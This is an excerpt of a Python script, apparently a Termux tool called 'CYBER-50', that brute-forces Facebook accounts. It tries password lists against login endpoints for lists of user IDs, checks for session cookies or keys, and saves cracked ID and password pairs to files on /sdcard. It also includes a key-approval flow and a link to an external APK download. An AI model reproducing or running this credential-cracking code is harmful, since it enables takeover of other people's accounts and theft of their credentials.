...
os.system('xdg-openhttps://www.facebook.com/groups/258862096423615/')
...
--------------------------------------------------
 Author    : I'TS ZIHAD
 Github    : CYBER-31
 Facebook  : ZIHAD ISLAM MEHEDI
 Tool Name : CYBER-50
 Type type : Free
 Version   : 1.3
----------------------------------------------
CYBER-50 free version 1.3

TAKE ❤️ Guy's 

 For Haters: I,am Only One Piece  🤞
\033[1;37m----------------------------------------------""")
def linex():
        print('\033[1;37m----------------------------------------------')
def clear():
        ...
        #       chk()
                ...
                if x == ("sex"):
                        ...
                        if xd in ['1','01']:
                                ...
                                os.system('xdg-open https://mediafire.com/file/y1wvgc2zqqunxbn/Fuck_VPN1.0.apk/file');menu()
                        elif xd in ['8','08']:
                                os.system('xdg-open https://www.facebook.com/100074889000735/posts/pfbid0CZ9vn6qRF78vmdk4V3ja7Rx5mZa1hsmMaaTNXms2kkVyt1EZ7k5seWMjQd7pDfvvl/?app=fbl');menu()
                        elif xd in ['0','00']:
                                exit(' Thanks for use 🥰 ')
                        else:
                        ...
                        linex()
                        tks = ("Hi Zihad Sir, I Need To Approvel Tools Version 1.3  Free Please Accept My Key To Approval :)\n\n Name :- "+name+"\n Key :- "+fkeyx)
                        subprocess.check_output(["am", "start", url_wa+(tks)]);time.sleep(2)
                        print(' Run :  python King.py')
                        exit()
        except ValueError:
                exit()
        except requests.exceptions.ConnectionError:
...
def pak():
                user=[]
                clear()
                print('\033[1;31m Code example: 017,018,019,016')
...
def ffb(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write('\r\r\033[1;37m [CYBER-50-XD] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        if "c_user" in king:
                                ...
                                print('\r\r\033[1;32m [CYBER-50-OK] %s | %s'%(ids,pas))
                                open('/sdcard/CYBER-50-OK.txt', 'a').write(ids+'|'+pas+'\n')
                                oks.append(ids)
                                break
                        elif 'checkpoint' in king:
                                if 'y' in pcp:
                                        print('\r\r\x1b[38;5;208m [CYBER-50-CP] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/CYBER-50-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                                else:
                                        break
...
def api(ids,names,passlist):
                try:
                        ...
                        for pw in passlist:
                                ...
                                q = json.loads(po)
                                if 'session_key' in q:
                                        print('\r\r\033[1;32m [CYBER-50-OK] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/CYBER-50-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                ...
                try:
                        ...
                        for pas in passlist:
                                ...
                                if 'session_key' in q:
                                        uid=str(q['uid'])
                                        try:
                                                okk=open('/sdcard/CYBER-50-OK.txt','r').read()
                                                if uid in okk:pass
                                                else:
                                                        print('\r\r\033[1;32m [CYBER-50-OK] '+uid+' | '+pas+'\033[1;97m')
                                                        open('/sdcard/CYBER-50-OK.txt','a').write(uid+'|'+pas+'\n')
                                                        oks.append(ids)
                                                        break
                                        except:
                                                print('\r\r\033[1;32m [CYBER-50-OK] '+uid+' | '+pas+'\033[1;97m')
